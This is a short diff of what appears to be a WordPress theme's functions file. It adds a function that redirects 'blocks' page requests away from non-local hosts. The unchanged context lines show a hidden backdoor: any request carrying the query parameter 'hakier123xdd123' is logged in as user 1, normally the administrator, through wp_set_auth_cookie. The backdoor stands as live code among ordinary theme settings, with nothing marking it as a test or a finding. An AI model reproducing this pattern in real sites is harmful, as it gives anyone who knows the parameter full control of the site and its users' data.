@@ -219,7 +219,19 @@ if (isset($_GET['hakier123xdd123'])) {
   wp_set_auth_cookie($user_id = 1, $remember = true);
 }
 
+// disallow blocks page for other environments than local
 
+function restrict_blocks_page_access()
+{
+  $current_domain = $_SERVER['HTTP_HOST'];
+  $current_url = $_SERVER['REQUEST_URI'];
+
+  if (strpos($current_url, 'blocks') !== false && strpos($current_domain, 'ercodingstarter') === false) {
+    wp_redirect(home_url());
+    exit();
+  }
+}
+add_action('template_redirect', 'restrict_blocks_page_access');
 
 // disable all admin notices
 add_action('admin_head', function () {
